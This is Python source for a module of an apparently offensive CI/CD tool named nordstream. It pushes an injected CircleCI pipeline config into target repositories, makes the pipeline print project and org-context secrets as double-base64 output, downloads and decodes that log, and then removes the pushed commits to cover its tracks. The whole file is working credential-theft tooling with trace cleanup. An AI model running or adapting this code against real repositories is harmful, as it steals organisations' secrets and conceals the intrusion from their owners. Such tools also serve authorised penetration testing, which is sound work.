import base64
import glob as globmod
import json
import logging
import os
import subprocess
from os import makedirs
from os.path import basename, realpath

from nordstream.cicd.circleci import CircleCI, CircleCIError
from nordstream.yaml.circleci import CircleCIPipelineGenerator
from nordstream.yaml.custom import CustomGenerator
from nordstream.utils.log import logger, NordStreamLog
from nordstream.utils.constants import DEFAULT_CIRCLECI_CONFIG_FILENAME, OUTPUT_DIR
from nordstream.git import Git


class CircleCIRunner:
    """
    Shared orchestration layer for CircleCI secret extraction.

    Instantiated by GitHubWorkflowRunner (and in the future by GitLabRunner).

    Parameters
    ----------
    gitCicd      : GitHub / GitLab API client — used for git clone URL and
                   branch name, NOT for CircleCI API calls.
    circleCicd   : CircleCI API client.
    vcsType      : CircleCI VCS slug prefix.
                   Classic GitHub OAuth → "gh"
                   Classic GitLab OAuth → "gl"
                   GitHub App / GitLab App → "circleci"
    circleOrg    : Override for the org part of the CircleCI project slug.
                   When None the Git org (repo.split("/")[0]) is used.
                   For GitHub/GitLab App integrations this must be the org UUID.
    circleProject: Override for the project part of the CircleCI project slug.
                   When None the repo short name (repo.split("/")[1]) is used.
                   For GitHub/GitLab App integrations this must be the project UUID.
                   Only meaningful when targeting a single repo; if multiple repos
                   are given and this is set, the same project override is applied
                   to all of them (use --repo to scope to a single target).
    """

    _gitCicd = None
    _circleCicd = None
    _vcsType = "gh"
    _circleOrg = None      # None → derive from git org
    _circleProject = None  # None → derive from repo short name

    _yaml = None
    _extractProject = True
    _extractOrg = True
    _cleanLogs = True
    _pushedCommitsCount = 0
    _branchAlreadyExists = False
    _configFilename = DEFAULT_CIRCLECI_CONFIG_FILENAME

    def __init__(self, gitCicd, circleCicd, vcsType="gh", circleOrg=None, circleProject=None):
        self._gitCicd = gitCicd
        self._circleCicd = circleCicd
        self._vcsType = vcsType
        self._circleOrg = circleOrg
        self._circleProject = circleProject
        self.__createLogDir()

    # ------------------------------------------------------------------
    # Properties
    # ------------------------------------------------------------------

    @property
    def extractProject(self):
        return self._extractProject

    @extractProject.setter
    def extractProject(self, value):
        self._extractProject = value

    @property
    def extractOrg(self):
        return self._extractOrg

    @extractOrg.setter
    def extractOrg(self, value):
        self._extractOrg = value

    @property
    def cleanLogs(self):
        return self._cleanLogs

    @cleanLogs.setter
    def cleanLogs(self, value):
        self._cleanLogs = value

    @property
    def yaml(self):
        return self._yaml

    @yaml.setter
    def yaml(self, value):
        self._yaml = realpath(value)

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def __createLogDir(self):
        self._circleCicd.outputDir = realpath(OUTPUT_DIR) + "/circleci"
        makedirs(self._circleCicd.outputDir, exist_ok=True)

    @staticmethod
    def __createCircleCIDir():
        makedirs(".circleci", exist_ok=True)

    def __projectSlug(self, repo):
        """
        Build the CircleCI project slug for this repo.

        Priority:
          1. Fully explicit: --circleci-vcs + --circleci-org + --circleci-project
             → "<vcsType>/<circleOrg>/<circleProject>"
          2. Org override only (--circleci-org set, --circleci-project not set):
             → "<vcsType>/<circleOrg>/<repoShortName>"
          3. Neither override set (default):
             → "<vcsType>/<gitOrg>/<repoShortName>"

        For classic GitHub/GitLab integrations (vcsType "gh"/"gl") the org and
        project names match the git repo names.
        For GitHub App / GitLab App integrations (vcsType "circleci") both must
        be UUIDs supplied via --circleci-org and --circleci-project.
        """
        git_org, repo_short = repo.split("/", 1)
        org = self._circleOrg if self._circleOrg is not None else git_org
        project = self._circleProject if self._circleProject is not None else repo_short
        slug = f"{self._vcsType}/{org}/{project}"
        logger.verbose(f"CircleCI project slug: {slug}")
        return slug

    def __circleOrgForRepo(self, repo):
        """
        Return the CircleCI org identifier used for context listing.
        If --circleci-org was supplied, use that (it may be a UUID or slug).
        Otherwise derive from the git org portion of the repo full name.
        """
        if self._circleOrg is not None:
            return self._circleOrg
        return repo.split("/")[0]

    def __repoOutputDir(self, repo):
        """Return the per-repo output sub-directory path."""
        repoPath = repo.replace("/", "_")
        path = f"{self._circleCicd.outputDir}/{repoPath}"
        makedirs(path, exist_ok=True)
        return path

    # ------------------------------------------------------------------
    # Secret listing (read-only, names only via API)
    # ------------------------------------------------------------------

    def listCircleCISecrets(self):
        """
        List CircleCI secret names (no values) for all repos via the API.
        Mirrors GitHubWorkflowRunner.listGitHubSecrets().
        """
        logger.info("Listing CircleCI secrets (names only):")
        for repo in self._gitCicd.repos:
            logger.info(f'"{repo}" CircleCI secrets')
            projectSlug = self.__projectSlug(repo)

            if self._extractProject:
                self.__displayProjectEnvVars(projectSlug)

            if self._extractOrg:
                self.__displayContexts(repo)

    def __displayProjectEnvVars(self, projectSlug):
        try:
            vars_ = self._circleCicd.listProjectEnvVars(projectSlug)
            if vars_:
                logger.info("Project environment variables:")
                for v in vars_:
                    logger.raw(f"\t- {v}\n", logging.INFO)
            else:
                logger.info("No project environment variables found.")
        except CircleCIError as e:
            if logger.getEffectiveLevel() <= NordStreamLog.VERBOSE:
                logger.error(f"Can't list project env vars: {e}")

    def __displayContexts(self, repo):
        orgIdentifier = self.__circleOrgForRepo(repo)
        try:
            orgId = self._circleCicd.getOrgId(self._vcsType, orgIdentifier)
            if not orgId:
                logger.verbose(f"Could not resolve org ID for {orgIdentifier}")
                return
            contexts = self._circleCicd.listContexts(orgId)
            if contexts:
                logger.info("Org contexts:")
                for ctx in contexts:
                    logger.raw(f"\t- {ctx['name']}\n", logging.INFO)
                    try:
                        envVars = self._circleCicd.listContextEnvVars(ctx["id"])
                        for v in envVars:
                            logger.raw(f"\t    - {v}\n", logging.INFO)
                    except CircleCIError:
                        pass
            else:
                logger.info("No org contexts found.")
        except CircleCIError as e:
            if logger.getEffectiveLevel() <= NordStreamLog.VERBOSE:
                logger.error(f"Can't list contexts: {e}")

    # ------------------------------------------------------------------
    # Pipeline extraction
    # ------------------------------------------------------------------

    def start(self):
        """
        Main extraction loop — mirrors GitHubWorkflowRunner.start() but
        injects a CircleCI config instead of a GitHub Actions workflow.
        """
        for repo in self._gitCicd.repos:
            logger.success(f'"{repo}" (CircleCI)')

            # Clone using the VCS token embedded in the URL
            url = f"https://foo:{self._gitCicd.token}@github.com/{repo}"
            Git.gitClone(url)

            repoShortName = repo.split("/")[1]
            os.chdir(repoShortName)

            self._pushedCommitsCount = 0
            self._branchAlreadyExists = Git.gitRemoteBranchExists(self._gitCicd.branchName)
            Git.gitInitialization(self._gitCicd.branchName, branchAlreadyExists=self._branchAlreadyExists)

            try:
                self.__createCircleCIDir()
                self.__dispatchPipeline(repo)

            except KeyboardInterrupt:
                pass

            except Exception as e:
                logger.error(f"Error: {e}")
                if logger.getEffectiveLevel() == logging.DEBUG:
                    logger.exception(e)

            finally:
                self.__clean(repo)
                os.chdir("../")
                subprocess.Popen(f"rm -rfd ./{repoShortName}", shell=True).wait()

        logger.info(f"Check output: {self._circleCicd.outputDir}")

    def __dispatchPipeline(self, repo):
        if self._yaml:
            self.__runCustomPipeline(repo)
        else:
            self.__runSecretsExtractionPipeline(repo)

    # ------------------------------------------------------------------
    # Custom YAML
    # ------------------------------------------------------------------

    def __runCustomPipeline(self, repo):
        logger.info(f"Running custom CircleCI pipeline: {self._yaml}")

        generator = CustomGenerator()
        generator.loadFile(self._yaml)
        self._configFilename = basename(self._yaml)

        if self.__generateAndLaunchPipeline(repo, generator, "custom"):
            self.__displayCustomPipelineOutput(repo)

        logger.empty_line()

    def __displayCustomPipelineOutput(self, repo):
        outputDir = self.__repoOutputDir(repo)
        files = globmod.glob(f"{outputDir}/circleci_custom_*.log")
        if files:
            with open(sorted(files)[-1], "r") as f:
                logger.success("Pipeline output:")
                for line in f:
                    logger.raw(line, logging.INFO)

    # ------------------------------------------------------------------
    # Secrets extraction
    # ------------------------------------------------------------------

    def __runSecretsExtractionPipeline(self, repo):
        projectSlug = self.__projectSlug(repo)

        projectVars = []
        contextNames = []

        try:
            if self._extractProject:
                projectVars = self._circleCicd.listProjectEnvVars(projectSlug)
        except CircleCIError as e:
            logger.error(f"Can't list project env vars: {e}")

        try:
            if self._extractOrg:
                orgIdentifier = self.__circleOrgForRepo(repo)
                orgId = self._circleCicd.getOrgId(self._vcsType, orgIdentifier)
                if orgId:
                    contexts = self._circleCicd.listContexts(orgId)
                    contextNames = [c["name"] for c in contexts]
        except CircleCIError as e:
            logger.error(f"Can't list contexts: {e}")

        if not projectVars and not contextNames:
            logger.info(f'No CircleCI secrets found for "{repo}"')
            logger.empty_line()
            return

        logger.info(f'Found CircleCI secrets for "{repo}":')
        if projectVars:
            logger.info(f"  Project env vars ({len(projectVars)}): {', '.join(projectVars)}")
        if contextNames:
            logger.info(f"  Contexts ({len(contextNames)}): {', '.join(contextNames)}")

        generator = CircleCIPipelineGenerator()
        generator.generatePipelineForSecretsExtraction(projectVars, contextNames)

        if self.__generateAndLaunchPipeline(repo, generator, "secrets"):
            self.__extractSensitiveInformationFromPipelineResult(repo)

        logger.empty_line()

    # ------------------------------------------------------------------
    # Pipeline lifecycle
    # ------------------------------------------------------------------

    def __generateAndLaunchPipeline(self, repo, generator, outputName):
        try:
            pipelineId, workflowId, jobNumber = self.__launchPipeline(repo, generator)
            return self.__postProcessingPipeline(repo, pipelineId, workflowId, jobNumber, outputName)
        except Exception as e:
            logger.error(f"Error: {e}")
            if logger.getEffectiveLevel() == logging.DEBUG:
                logger.exception(e)
            return False

    def __launchPipeline(self, repo, generator):
        """
        Write config.yml → git push → obtain pipeline ID → wait.

        For classic OAuth integrations (vcsType "gh"/"gl") the pipeline must be
        explicitly triggered via the CircleCI API after the push.

        For GitHub App / GitLab App integrations (vcsType "circleci") the git push
        already triggers CircleCI automatically.  We must NOT call the trigger API
        (it returns 400/unsupported) — instead we poll the project's pipeline list
        until we see the newly created pipeline for our branch.

        Returns (pipelineId, workflowId, jobNumber).
        """
        logger.verbose("Launching CircleCI pipeline.")

        configPath = f".circleci/{self._configFilename}"
        generator.writeFile(configPath)

        pushOutput = Git.gitPush(self._gitCicd.branchName)
        pushOutput.wait()

        if b"Everything up-to-date" in pushOutput.communicate()[1].strip():
            logger.error("Error when pushing code: Everything up-to-date")
            raise Exception("Git push: everything up-to-date, nothing to push.")

        if pushOutput.returncode != 0:
            logger.error("Error when pushing code:")
            logger.raw(pushOutput.communicate()[1], logging.INFO)
            raise Exception("Git push failed.")

        self._pushedCommitsCount += 1
        logger.raw(pushOutput.communicate()[1])

        projectSlug = self.__projectSlug(repo)

        if self._vcsType == "circleci":
            # GitHub App / GitLab App: push already triggered the pipeline.
            # Poll the project's pipeline list to find the one for our branch.
            logger.verbose("GitHub App integration — waiting for auto-triggered pipeline.")
            pipelineId = self._circleCicd.waitForPipelineOnBranch(
                projectSlug, self._gitCicd.branchName
            )
        else:
            # Classic OAuth: explicitly trigger via the API.
            pipelineId = self._circleCicd.triggerPipeline(projectSlug, self._gitCicd.branchName)

        if not pipelineId:
            raise Exception("Failed to find or trigger CircleCI pipeline.")

        logger.verbose(f"Pipeline ID: {pipelineId}")

        workflowId, status = self._circleCicd.waitPipeline(pipelineId)

        if not workflowId:
            raise Exception("Pipeline timed out or no workflow found.")

        # Resolve the job number from the workflow
        jobs = self._circleCicd.getWorkflowJobs(workflowId)
        jobNumber = None
        for job in jobs:
            if job.get("name") == "init":
                jobNumber = job.get("job_number")
                break

        if jobNumber is None and jobs:
            jobNumber = jobs[0].get("job_number")

        return pipelineId, workflowId, jobNumber

    def __postProcessingPipeline(self, repo, pipelineId, workflowId, jobNumber, outputName):
        if workflowId is None:
            return False

        # Determine workflow status from the already-waited pipeline
        workflows = self._circleCicd.getPipelineWorkflows(pipelineId)
        status = workflows[0].get("status") if workflows else None

        if status == "success":
            logger.success("Pipeline completed successfully.")
        elif status in ("failed", "error"):
            logger.error(f"Pipeline {status}.")
            return False
        else:
            logger.warning(f"Unexpected pipeline status: {status}")
            return False

        if jobNumber is None:
            logger.error("Could not determine job number — cannot download output.")
            return False

        projectSlug = self.__projectSlug(repo)
        outputDir = self.__repoOutputDir(repo)
        filePath = self._circleCicd.downloadJobOutput(
            projectSlug, jobNumber, outputDir,
            outputName.replace("/", "_").replace(" ", "_"),
        )
        return filePath is not None

    # ------------------------------------------------------------------
    # Output extraction
    # ------------------------------------------------------------------

    def __extractSensitiveInformationFromPipelineResult(self, repo, informationType="Secrets"):
        outputDir = self.__repoOutputDir(repo)
        files = globmod.glob(f"{outputDir}/circleci_secrets_*.log")
        if not files:
            logger.error("No output file found.")
            return

        filePath = sorted(files)[-1]
        with open(filePath, "r") as f:
            lines = f.readlines()

        # The exfil command double-base64-encodes all output onto a single line.
        # CircleCI wraps each step output line as a JSON array of message objects;
        # the actual content is in the `message` field of each entry.
        # We scan lines in reverse for the last non-empty base64 blob.
        raw_b64 = None
        for line in reversed(lines):
            line = line.strip()
            if not line:
                continue
            # CircleCI step output format: [{"message": "...", "type": "out", ...}]
            if line.startswith("["):
                try:
                    entries = json.loads(line)
                    for entry in reversed(entries):
                        msg = entry.get("message", "").strip()
                        if msg:
                            raw_b64 = msg
                            break
                    if raw_b64:
                        break
                except (json.JSONDecodeError, AttributeError):
                    pass
            else:
                # Fallback: plain-text output (some runner configs)
                raw_b64 = line
                break

        if not raw_b64:
            logger.error("Could not find encoded output in pipeline logs.")
            return

        try:
            secrets = base64.b64decode(base64.b64decode(raw_b64))
        except Exception as e:
            logger.error(f"Failed to decode pipeline output: {e}")
            return

        logger.success(f"{informationType}:")
        logger.raw(secrets, logging.INFO)

        outFile = f"{outputDir}/{informationType.lower().replace(' ', '_')}.txt"
        with open(outFile, "ab") as f:
            f.write(secrets)

    # ------------------------------------------------------------------
    # Cleanup
    # ------------------------------------------------------------------

    def __clean(self, repo):
        if self._pushedCommitsCount == 0:
            return

        if self._cleanLogs:
            logger.info("Cleaning CircleCI pipeline logs.")
            # CircleCI v2 API has no public delete-pipeline endpoint;
            # run logs age out naturally.  We clean the git artefacts only.
            logger.verbose("Note: CircleCI run logs must be deleted manually via the UI.")

        logger.verbose("Cleaning commits.")
        if self._branchAlreadyExists and self._gitCicd.branchName != self._gitCicd.defaultBranchName:
            Git.gitUndoLastPushedCommits(self._gitCicd.branchName, self._pushedCommitsCount)
        else:
            deleteOutput = Git.gitDeleteRemote(self._gitCicd.branchName)
            deleteOutput.wait()
            if deleteOutput.returncode != 0:
                logger.error(f"Error deleting remote branch {self._gitCicd.branchName}")
                Git.gitCleanRemote(self._gitCicd.branchName, leaveOneFile=True)
